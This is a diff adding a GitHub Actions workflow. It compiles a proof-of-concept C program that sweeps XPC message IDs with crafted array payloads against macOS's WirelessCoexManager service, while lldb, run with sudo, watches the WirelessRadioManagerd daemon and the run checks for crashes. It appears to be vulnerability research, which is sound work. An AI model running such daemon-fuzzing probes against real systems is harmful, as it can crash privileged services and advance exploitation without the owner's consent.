@@ -1,0 +1,106 @@
+name: wcm-enum-ids
+on:
+  workflow_dispatch:
+
+jobs:
+  enum:
+    runs-on: macos-15
+    timeout-minutes: 18
+    steps:
+      - name: build poc that sweeps all messageIds with array
+        run: |
+          mkdir -p /tmp/w
+          cat > /tmp/w/poc.c <<'EOF'
+          #include <xpc/xpc.h>
+          #include <dispatch/dispatch.h>
+          #include <stdio.h>
+          #include <stdlib.h>
+          static const char *SVC = "com.apple.WirelessCoexManager";
+          static xpc_object_t send_sync(xpc_connection_t c, xpc_object_t msg, double t) {
+              dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+              __block xpc_object_t reply = NULL;
+              xpc_connection_send_message_with_reply(c, msg,
+                  dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0),
+                  ^(xpc_object_t r) { reply = xpc_retain(r); dispatch_semaphore_signal(sem); });
+              if (dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(t*NSEC_PER_SEC))) != 0) return NULL;
+              return reply;
+          }
+          int main(int argc, char **argv) {
+              int start = (argc > 1) ? atoi(argv[1]) : 0;
+              int end = (argc > 2) ? atoi(argv[2]) : 200;
+              int nelem = (argc > 3) ? atoi(argv[3]) : 40;
+              xpc_connection_t c = xpc_connection_create_mach_service(SVC,
+                  dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), 0);
+              if (!c) return 1;
+              xpc_connection_set_event_handler(c, ^(xpc_object_t e) { (void)e; });
+              xpc_connection_resume(c);
+              printf("sweeping messageId %d..%d nelem=%d\n", start, end, nelem); fflush(stdout);
+
+              for (int mid = start; mid <= end; mid++) {
+                  xpc_object_t arr = xpc_array_create(NULL, 0);
+                  for (int i = 0; i < nelem; i++) {
+                      xpc_object_t e = xpc_dictionary_create(NULL, NULL, 0);
+                      xpc_dictionary_set_uint64(e, "kWCMCellularNetworkConfiguration_BandInfoSet_DirectionMask", 1);
+                      xpc_dictionary_set_int64(e, "kWCMCellularNetworkConfiguration_BandInfoSet_CenterFreq", 1000 + i);
+                      xpc_dictionary_set_double(e, "kWCMCellularNetworkConfiguration_BandInfoSet_Bandwidth", 10.0);
+                      xpc_array_append_value(arr, e);
+                      xpc_release(e);
+                  }
+                  xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+                  xpc_dictionary_set_uint64(m, "kMessageId", mid);
+                  xpc_object_t a = xpc_dictionary_create(NULL, NULL, 0);
+                  xpc_dictionary_set_value(a, "kWCMCellularNetworkConfiguration_BandInformationSet", arr);
+                  xpc_dictionary_set_int64(a, "kSubId", 0);
+                  xpc_dictionary_set_value(m, "kMessageArgs", a);
+                  xpc_object_t r = send_sync(c, m, 0.3);
+                  printf("mid=%d reply=%d\n", mid, r != NULL); fflush(stdout);
+                  if (r) xpc_release(r);
+                  xpc_release(arr); xpc_release(a); xpc_release(m);
+              }
+              printf("SWEEP DONE\n");
+              xpc_connection_cancel(c);
+              return 0;
+          }
+          EOF
+          clang -fblocks -O0 -o /tmp/w/poc /tmp/w/poc.c -framework Foundation
+          ls -la /tmp/w/poc
+        continue-on-error: true
+
+      - name: sweep messageIds with array payload while watching for array_count
+        run: |
+          set +e
+          PID=$(pgrep -x WirelessRadioManagerd | head -1)
+          echo "PID=$PID"
+          # 只在 xpc_array_get_count 上设断点 —— 任何 controller 解析数组都会调这个
+          cat > /tmp/w/arr.lldb <<'LDB'
+          settings set auto-confirm true
+          br s -n xpc_array_get_count
+          br command add 1
+          printf "ARRAY_COUNT_HIT\n"
+          bt 4
+          detach
+          quit
+          DONE
+          continue
+          LDB
+          ( sudo lldb -b -p "$PID" -s /tmp/w/arr.lldb > /tmp/w/arr.log 2>&1 ) &
+          LP=$!
+          sleep 6
+          echo "--- sweep 0-200 ---"
+          /tmp/w/poc 0 200 40
+          sleep 15
+          echo "--- sweep 200-400 ---"
+          /tmp/w/poc 200 400 40
+          sleep 15
+          kill $LP 2>/dev/null; pkill -f "lldb -b -p" 2>/dev/null
+          sleep 2
+          echo "=== array_count 命中 ==="
+          grep -c "ARRAY_COUNT_HIT" /tmp/w/arr.log
+          grep -A5 "ARRAY_COUNT_HIT" /tmp/w/arr.log | head -30
+          echo
+          echo "=== daemon alive? ==="
+          pgrep -x WirelessRadioManagerd
+          echo "=== 崩溃报告 ==="
+          sudo ls -lat /Library/Logs/DiagnosticReports/ 2>/dev/null | head -4
+          true
+        continue-on-error: true
